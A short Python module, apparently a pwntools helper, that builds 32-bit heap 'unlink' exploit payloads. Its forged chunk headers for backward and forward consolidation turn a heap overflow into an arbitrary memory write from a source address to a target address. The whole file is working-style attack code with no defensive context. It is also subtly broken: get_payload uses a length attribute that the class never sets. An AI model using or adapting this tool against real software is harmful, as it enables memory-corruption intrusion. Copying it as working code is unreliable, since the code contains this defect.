from pwn import fit, p32


class i386_payload:
    def __init__(self, target, source,
                 offset, length, null_bytes=False):
        self.target = target
        self.source = source
        self.offset = offset
        self.post_length = length - offset - 8
        self.null_bytes = null_bytes
        self.payload = ""
        if self.null_bytes is False:
            if self.offset < 16 or self.post_length < 20:
                raise LengthError("Not enough length for payload")

    def backward_consolidate(self):
        if self.null_bytes is True:
            self.payload = fit({self.offset - 16: p32(9)*2,
                                self.offset - 8: p32(self.target-12),
                                self.offset - 4: p32(self.source),
                                self.offset: p32(0x10) + p32(8),
                                self.offset + 8: p32(1)*2
                                })
        else:
            self.payload = fit({self.offset - 16: p32(-7, signed=True)*2,
                                self.offset - 8: p32(-7, signed=True)*2,
                                self.offset: p32(-8, signed=True)*2,
                                self.offset + 8: p32(-7, signed=True)*2,
                                self.offset + 16: p32(self.target-12),
                                self.offset + 20: p32(self.source)
                                })
        return self.payload

    def forward_consolidate(self):
        offset = self.offset
        target = self.target
        source = self.source
        if self.null_bytes is True:
            self.payload = fit({self.offset + 4: p32(1),
                                self.offset + 8: p32(self.target-8),
                                self.offset + 12: p32(self.source)
                                })
        else:
            self.payload = fit({self.offset - 20: p32(-16, signed=True),
                                self.offset - 16: p32(-15, signed=True),
                                self.offset - 12: p32(-3, signed=True),
                                self.offset - 8: p32(self.target-8),
                                self.offset - 4: p32(self.source),
                                self.offset + 4: p32(-15, signed=True)
                                })
        return self.payload

    def get_payload(self):
        self.payload = self.backward_consolidate()
        if len(self.payload) < self.length:
            return self.payload
        else:
            self.payload = self.forward_consolidate()
            if len(self.payload) < self.length:
                return self.payload


class LengthError(Exception):
    def __init__(self, message):
        self.message = message
